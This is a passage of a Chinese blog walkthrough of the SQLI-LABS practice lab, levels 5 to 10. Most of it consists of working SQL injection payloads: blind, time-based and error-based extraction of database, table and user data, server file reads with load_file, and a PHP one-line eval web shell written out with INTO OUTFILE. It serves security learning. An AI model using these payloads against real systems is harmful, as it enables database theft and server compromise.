+<h3 id="4、利用-ord-和-mid-函数得到user表中的内容"><a href="#4、利用-ord-和-mid-函数得到user表中的内容" class="headerlink" title="4、利用 ord() 和 mid() 函数得到user表中的内容"></a><strong>4、利用 <em>ord()</em> 和 <em>mid()</em> 函数得到user表中的内容</strong></h3><p><em>ord()</em> 和 <em>ascii()</em> 作用相同， <em>mid()</em> 和 <em>substr()</em> 作用相同，爆表内容：<code>?id=1’ and ord(mid((select ifnull(cast(username as char),0x20) from security.users order by id limit 0,1),1,1))=68–+</code>，当然，还有一个简化一点的<code>?id=1’ and binary mid((select username from security.users order by id limit 0,1),1,3)=’Dum’–+</code> ，我比较推荐这个，这个更简单一点。这样就可以得到表中的所有内容了。<code>binary</code> 关键字可以在比较时区分大小写。</p>
+<p>经过这四步就可以得到整个表的信息了。</p>
+<h2 id="2、报错注入"><a href="#2、报错注入" class="headerlink" title="2、报错注入"></a>2、报错注入</h2><h3 id="1、-concat-计数报错"><a href="#1、-concat-计数报错" class="headerlink" title="1、 concat() 计数报错"></a>1、 <em>concat()</em> 计数报错</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="number">0x3a</span>,<span class="number">0x3a</span>,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">0x3a</span>,<span class="number">0x3a</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>))a <span class="keyword">from</span> information_schema.columns <span class="keyword">group</span> <span class="keyword">by</span> a<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<p>页面会返回</p>
+<blockquote>
+<p>Duplicate entry ‘::root@localhost::0’ for key ‘’</p>
+</blockquote>
+<p>这样就可以得到数据库名等信息。报错原因待研究</p>
+<h3 id="2、-基于double类型溢出进行报错"><a href="#2、-基于double类型溢出进行报错" class="headerlink" title="2、 基于double类型溢出进行报错"></a>2、 基于double类型溢出进行报错</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' union <span class="keyword">select</span> (<span class="keyword">exp</span>(~(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">database</span>()) a ))),<span class="number">2</span>,<span class="number">3</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<p>返回</p>
+<blockquote>
+<p>DOUBLE value is out of range in ‘exp(~((select <code>a</code>.<code>user()</code> from (select user() AS <code>user()</code>) <code>a</code>)))’</p>
+</blockquote>
+<p>很遗憾，我的报错没有返回信息，很痛苦。还需要在研究</p>
+<h3 id="3、-使用bigint溢出进行报错"><a href="#3、-使用bigint溢出进行报错" class="headerlink" title="3、 使用bigint溢出进行报错"></a>3、 使用bigint溢出进行报错</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' union <span class="keyword">select</span> (!(<span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">user</span>())x) - ~<span class="number">0</span>),<span class="number">2</span>,<span class="number">3</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<p>依然没成功，可能是版本的问题</p>
+<h3 id="4、xpath函数报错注入"><a href="#4、xpath函数报错注入" class="headerlink" title="4、xpath函数报错注入"></a>4、xpath函数报错注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>))<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<p>页面返回</p>
+<blockquote>
+<p>XPATH syntax error: ‘~5.7.14~’</p>
+</blockquote>
+<p>得到版本信息。</p>
+<p>利用继续注入可以得到表名等信息<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>))<span class="comment">--+</span></span><br></pre></td></tr></table></figure></p>
+<p>后面不在赘述</p>
+<p>还有一种方法<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and updatexml(1,concat(0x7e,(<span class="keyword">select</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure></p>
+<p>和第一个效果一样。</p>
+<h3 id="5、-利用数据的重复性"><a href="#5、-利用数据的重复性" class="headerlink" title="5、 利用数据的重复性"></a>5、 利用数据的重复性</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">NAME_CONST</span>(<span class="keyword">version</span>(),<span class="number">1</span>), <span class="keyword">NAME_CONST</span>(<span class="keyword">version</span>() ,<span class="number">1</span>))x<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<p> 这个貌似只能爆出数据库版本，我尝试爆数据库名什么的都不行。 </p>
+<blockquote>
+<p><em>NAME_CONST(name,value)</em>：用于生成结果集列时，NAME_CONST()会使列具有给定的名称name。参数value应该是常数。</p>
+</blockquote>
+<h2 id="3、延时注入"><a href="#3、延时注入" class="headerlink" title="3、延时注入"></a>3、延时注入</h2><h3 id="1、利用-sleep-函数进行注入"><a href="#1、利用-sleep-函数进行注入" class="headerlink" title="1、利用 sleep() 函数进行注入"></a>1、利用 <em>sleep()</em> 函数进行注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and if(ascii(substr(database(),1,1))=116,1,sleep(5))<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<h3 id="2、利用-benchmark-进行延时注入"><a href="#2、利用-benchmark-进行延时注入" class="headerlink" title="2、利用 benchmark() 进行延时注入"></a>2、利用 <em>benchmark()</em> 进行延时注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1'union <span class="keyword">select</span> (<span class="keyword">if</span>(<span class="keyword">substring</span>(<span class="keyword">current</span>,<span class="number">1</span>,<span class="number">1</span>)=<span class="built_in">char</span>(<span class="number">115</span>),<span class="keyword">benchmark</span>(<span class="number">50000000</span>,<span class="keyword">encode</span>(<span class="string">'MSG'</span>,<span class="string">'by 5 seconds'</span>)),<span class="literal">null</span>)),<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">database</span>() <span class="keyword">as</span> <span class="keyword">current</span>) <span class="keyword">as</span> tb1<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<p>如果正确的话就会函数就会执行一段时间才返回。</p>
+<p>至此，各种盲注都演示了一遍。</p>
+<h1 id="LESS-6"><a href="#LESS-6" class="headerlink" title="LESS-6"></a>LESS-6</h1><p>单引号闭合变成了双引号闭合，payload：<code>?id=1”–+</code>，后面的话跟第五关一样。</p>
+<hr>
+<h1 id="导入导出相关操作"><a href="#导入导出相关操作" class="headerlink" title="导入导出相关操作"></a>导入导出相关操作</h1><h2 id="load-file"><a href="#load-file" class="headerlink" title="load_file()"></a><strong><font face="隶书">load_file()</font></strong></h2><p><em>load_file(file_name)</em>：读取文件并返回该文件的内容作为一个字符串。</p>
+<blockquote>
+<p>使用条件：<br>A.必须有权限读取并且文件可读<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> mysql.user)&gt;<span class="number">0</span><span class="comment">/* 如果结果返回正常，说明具有读写权限。如果返回错误，则说明管理员给数据库降权。</span></span><br></pre></td></tr></table></figure></p>
+<p>B.欲读取文件必须在服务器上。<br>C.必须指定文件完整的路径<br>D.欲读取文件必须小于max_allowed_packet。</p>
+</blockquote>
+<p>实际应用时，文件读取权限是最难满足的，我们有两个难点需要解决：</p>
+<blockquote>
+<p>绝对物理路径<br>构造有效的畸形语句(报错爆出绝对路径)</p>
+</blockquote>
+<p><strong>实例：</strong><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="keyword">hex</span>(<span class="keyword">replace</span>(<span class="keyword">load_file</span>(<span class="built_in">char</span>(<span class="number">99</span>,<span class="number">58</span>,<span class="number">92</span>,<span class="number">119</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">100</span>,<span class="number">111</span>,<span class="number">119</span>,<span class="number">115</span>,<span class="number">92</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">112</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">114</span>,<span class="number">92</span>,<span class="number">115</span>,<span class="number">97</span>,<span class="number">109</span>))))</span><br></pre></td></tr></table></figure></p>
+<p>利用hex()将文件导出来，特别是smb文件</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="keyword">load_file</span>(<span class="built_in">char</span>(<span class="number">99</span>,<span class="number">58</span>,<span class="number">47</span>,<span class="number">98</span>,<span class="number">111</span>,<span class="number">111</span>,<span class="number">116</span>,<span class="number">46</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">105</span>))</span><br></pre></td></tr></table></figure>
+<p><strong><font face="隶书">explain：</font></strong>c:/boot.ini的十六进制是0x633s2f626f6f742e696e69</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="keyword">load_file</span>(C:\\boot.ini)</span><br></pre></td></tr></table></figure>
+<p><strong><font face="隶书">explain：</font></strong>路径里的/用\\代替</p>
+<h2 id="load-data-file导入数据库"><a href="#load-data-file导入数据库" class="headerlink" title="load data file导入数据库"></a><strong><font face="隶书">load data file导入数据库</font></strong></h2><p>略。</p>
+<h2 id="导入到文件中"><a href="#导入到文件中" class="headerlink" title="导入到文件中"></a><strong>导入到文件中</strong></h2><p>SELECT INTO OUTFILE ‘file_name’,具体参阅其他文章。</p>
+<hr>
+<h1 id="LESS-7"><a href="#LESS-7" class="headerlink" title="LESS-7"></a>LESS-7</h1><p>这个题目有两种闭合方式, <code>?id=1’ or ‘a’=’a</code> 或者 <code>?id=1’))</code>，我们尝试导出文件</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1')) union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'G://PHPwamp/wamp64/tmp/less7.txt'</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<p>虽然会报错，但是可以看到文件还是导出成功了。</p>
+<blockquote>
+<p>Dumb    Dumb    Dumb<br>1        2        3</p>
+</blockquote>
+<p>所以我们可以导一句话木马进去。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1')) union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">'&lt;?php @eval($_post["mima"])?&gt;'</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'G:/PHPwamp/wamp64/tmp/7.php'</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<p>接下来就可以用菜刀等工具连接了，但是还是没连成功。<br>接下里也可以上传其他的东西。</p>
+<h1 id="LESS-8"><a href="#LESS-8" class="headerlink" title="LESS-8"></a>LESS-8</h1><p>简单尝试可得 <code>?id=1’ or 1=1 –+</code>可以回显，那么可以利用盲注，参考第五关。由于本关对报错返回信息进行了注释，故不可以利用报错注入。盲注payload<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%27and%20if(ascii(substr(database(),1,1))=115,1,sleep(5))<span class="comment">--+</span></span><br></pre></td></tr></table></figure></p>
+<p><strong>注意：</strong>这关要使用url编码了，否则无法正常回显。</p>
+<h1 id="LESS-9"><a href="#LESS-9" class="headerlink" title="LESS-9"></a>LESS-9</h1><p>通过标题可知是单引号闭合，由于没有回显，所以尝试用延时注入<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1'and if(ascii(substr(database(),1,1))=115,1,sleep(5))<span class="comment">--+</span></span><br></pre></td></tr></table></figure></p>
+<p>逐位爆破则可以得到数据库名security</p>
+<p>接下来爆表<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1'and if(ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'security'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">101</span>,<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">5</span>))<span class="comment">--+</span></span><br></pre></td></tr></table></figure></p>
+<p>爆列名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1'and if(ascii(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">3</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">105</span>,<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">5</span>))<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<p>这个表的前三个字段是一些系统信息，所以要从第四个结果开始注入。</p>
+<p>爆内容</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1'and if(ascii(substr((<span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">68</span>,<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">5</span>))<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<p>如此可以得到所有信息。</p>
+<h1 id="LESS-10"><a href="#LESS-10" class="headerlink" title="LESS-10"></a>LESS-10</h1><p>单引号闭合改成了双引号闭合，其他都不变。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1" and if(ascii(substr(database(),1,1))=115,1,sleep(5))<span class="comment">--+</span></span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+  <div>
+    
+      <div>
+    
+        <div style="text-align:center;color: #4b4b4b;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+    
+  </div>
+
+    
+
+    
+      
+    
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>您今天怎么辣么迷人！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/reward-wechat.png" alt="新城瑞雪 微信支付"/>
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/reward-alipay.jpg" alt="新城瑞雪 支付宝"/>
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+      <div>
+        
+
+
+
+  
+
+
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>新城瑞雪</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    
+    <a href="http://chaosec.top/2018/02/04/sqli-labs1/" title="SQLI-LABS(Less1-Less10)">http://chaosec.top/2018/02/04/sqli-labs1/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/SQL注入/" rel="tag"># SQL注入</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/02/03/MySql4/" rel="next" title="MySQL学习笔记(四)">
+                <i class="fa fa-chevron-left"></i> MySQL学习笔记(四)
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/02/07/mysql5/" rel="prev" title="MySQL学习笔记(五)">
+                MySQL学习笔记(五) <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">新城瑞雪</p>
+              <p class="site-description motion-element" itemprop="description">相逢意气为君饮</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives">
+                
+                    <span class="site-state-item-count">30</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index-2.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">6</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">14</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/PPointCharles" title="GitHub &rarr; https://github.com/PPointCharles" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i></a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                  
+                    
+                  
+                  <a href="mailto:1426594174@qq.com" title="E-Mail &rarr; mailto:1426594174@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i></a>
+                </span>
+              
+            </div>
+          
+
+          
+             <div class="cc-license motion-element" itemprop="license">
+              
+                
+              
+              
+              
+              <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"/></a>
+             </div>
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text"><a href="#&#x524D;&#x8A00;" class="headerlink" title="&#x524D;&#x8A00;"></a>&#x524D;&#x8A00;</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#系统数据库"><span class="nav-number">2.</span> <span class="nav-text"><a href="#&#x7CFB;&#x7EDF;&#x6570;&#x636E;&#x5E93;" class="headerlink" title="&#x7CFB;&#x7EDF;&#x6570;&#x636E;&#x5E93;"></a>&#x7CFB;&#x7EDF;&#x6570;&#x636E;&#x5E93;</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LESS-1"><span class="nav-number">3.</span> <span class="nav-text"><a href="#LESS-1" class="headerlink" title="LESS-1"></a>LESS-1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LESS-2"><span class="nav-number">4.</span> <span class="nav-text"><a href="#LESS-2" class="headerlink" title="LESS-2"></a>LESS-2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LESS-3"><span class="nav-number">5.</span> <span class="nav-text"><a href="#LESS-3" class="headerlink" title="LESS-3"></a>LESS-3</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LESS-4"><span class="nav-number">6.</span> <span class="nav-text"><a href="#LESS-4" class="headerlink" title="LESS-4"></a>LESS-4</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#盲注"><span class="nav-number">7.</span> <span class="nav-text"><a href="#&#x76F2;&#x6CE8;" class="headerlink" title="&#x76F2;&#x6CE8;"></a><em>&#x76F2;&#x6CE8;</em></span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#一、基于布尔的SQL盲注–构造逻辑判断"><span class="nav-number">7.1.</span> <span class="nav-text"><a href="#&#x4E00;&#x3001;&#x57FA;&#x4E8E;&#x5E03;&#x5C14;&#x7684;SQL&#x76F2;&#x6CE8;&#x2013;&#x6784;&#x9020;&#x903B;&#x8F91;&#x5224;&#x65AD;" class="headerlink" title="&#x4E00;&#x3001;&#x57FA;&#x4E8E;&#x5E03;&#x5C14;&#x7684;SQL&#x76F2;&#x6CE8;&#x2013;&#x6784;&#x9020;&#x903B;&#x8F91;&#x5224;&#x65AD;"></a>&#x4E00;&#x3001;&#x57FA;&#x4E8E;&#x5E03;&#x5C14;&#x7684;SQL&#x76F2;&#x6CE8;&#x2013;&#x6784;&#x9020;&#x903B;&#x8F91;&#x5224;&#x65AD;</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1、left-函数"><span class="nav-number">7.1.1.</span> <span class="nav-text"><a href="#1&#x3001;left-&#x51FD;&#x6570;" class="headerlink" title="1&#x3001;left()&#x51FD;&#x6570;"></a>1&#x3001;left()&#x51FD;&#x6570;</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2、ascii-，substr-函数"><span class="nav-number">7.1.2.</span> <span class="nav-text"><a href="#2&#x3001;ascii-&#xFF0C;substr-&#x51FD;&#x6570;" class="headerlink" title="2&#x3001;ascii()&#xFF0C;substr()&#x51FD;&#x6570;"></a>2&#x3001;ascii()&#xFF0C;substr()&#x51FD;&#x6570;</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3、ascii-函数"><span class="nav-number">7.1.3.</span> <span class="nav-text"><a href="#3&#x3001;ascii-&#x51FD;&#x6570;" class="headerlink" title="3&#x3001;ascii()&#x51FD;&#x6570;"></a>3&#x3001;ascii()&#x51FD;&#x6570;</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4、ord-函数"><span class="nav-number">7.1.4.</span> <span class="nav-text"><a href="#4&#x3001;ord-&#x51FD;&#x6570;" class="headerlink" title="4&#x3001;ord()&#x51FD;&#x6570;"></a>4&#x3001;ord()&#x51FD;&#x6570;</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5、regexp正则注入"><span class="nav-number">7.1.5.</span> <span class="nav-text"><a href="#5&#x3001;regexp&#x6B63;&#x5219;&#x6CE8;&#x5165;" class="headerlink" title="5&#x3001;regexp&#x6B63;&#x5219;&#x6CE8;&#x5165;"></a>5&#x3001;regexp&#x6B63;&#x5219;&#x6CE8;&#x5165;</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6、like匹配注入"><span class="nav-number">7.1.6.</span> <span class="nav-text"><a href="#6&#x3001;like&#x5339;&#x914D;&#x6CE8;&#x5165;" class="headerlink" title="6&#x3001;like&#x5339;&#x914D;&#x6CE8;&#x5165;"></a>6&#x3001;like&#x5339;&#x914D;&#x6CE8;&#x5165;</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、基于报错的注入"><span class="nav-number">7.2.</span> <span class="nav-text"><a href="#&#x4E8C;&#x3001;&#x57FA;&#x4E8E;&#x62A5;&#x9519;&#x7684;&#x6CE8;&#x5165;" class="headerlink" title="&#x4E8C;&#x3001;&#x57FA;&#x4E8E;&#x62A5;&#x9519;&#x7684;&#x6CE8;&#x5165;"></a>&#x4E8C;&#x3001;&#x57FA;&#x4E8E;&#x62A5;&#x9519;&#x7684;&#x6CE8;&#x5165;</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1、concat-计数报错"><span class="nav-number">7.2.1.</span> <span class="nav-text"><a href="#1&#x3001;concat-&#x8BA1;&#x6570;&#x62A5;&#x9519;" class="headerlink" title="1&#x3001;concat()&#x8BA1;&#x6570;&#x62A5;&#x9519;"></a>1&#x3001;concat()&#x8BA1;&#x6570;&#x62A5;&#x9519;</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2、exp"><span class="nav-number">7.2.2.</span> <span class="nav-text"><a href="#2&#x3001;exp" class="headerlink" title="2&#x3001;exp()"></a>2&#x3001;exp()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3、-0"><span class="nav-number">7.2.3.</span> <span class="nav-text"><a href="#3&#x3001;-0" class="headerlink" title="3&#x3001;~0"></a>3&#x3001;~0</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4、-xpath"><span class="nav-number">7.2.4.</span> <span class="nav-text"><a href="#4&#x3001;-xpath" class="headerlink" title="4&#x3001; xpath"></a>4&#x3001; xpath</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5、xpath"><span class="nav-number">7.2.5.</span> <span class="nav-text"><a href="#5&#x3001;xpath" class="headerlink" title="5&#x3001;xpath"></a>5&#x3001;xpath</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6、重复特性"><span class="nav-number">7.2.6.</span> <span class="nav-text"><a href="#6&#x3001;&#x91CD;&#x590D;&#x7279;&#x6027;" class="headerlink" title="6&#x3001;&#x91CD;&#x590D;&#x7279;&#x6027;"></a>6&#x3001;&#x91CD;&#x590D;&#x7279;&#x6027;</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#基于时间的SQL盲注"><span class="nav-number">7.3.</span> <span class="nav-text"><a href="#&#x57FA;&#x4E8E;&#x65F6;&#x95F4;&#x7684;SQL&#x76F2;&#x6CE8;" class="headerlink" title="&#x57FA;&#x4E8E;&#x65F6;&#x95F4;&#x7684;SQL&#x76F2;&#x6CE8;"></a>&#x57FA;&#x4E8E;&#x65F6;&#x95F4;&#x7684;SQL&#x76F2;&#x6CE8;</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1、sleep-函数"><span class="nav-number">7.3.1.</span> <span class="nav-text"><a href="#1&#x3001;sleep-&#x51FD;&#x6570;" class="headerlink" title="1&#x3001;sleep()&#x51FD;&#x6570;"></a>1&#x3001;sleep()&#x51FD;&#x6570;</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2、benchmark-函数"><span class="nav-number">7.3.2.</span> <span class="nav-text"><a href="#2&#x3001;benchmark-&#x51FD;&#x6570;" class="headerlink" title="2&#x3001;benchmark()&#x51FD;&#x6570;"></a>2&#x3001;benchmark()&#x51FD;&#x6570;</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LESS-5"><span class="nav-number">8.</span> <span class="nav-text"><a href="#LESS-5" class="headerlink" title="LESS-5"></a>LESS-5</span></a><ol 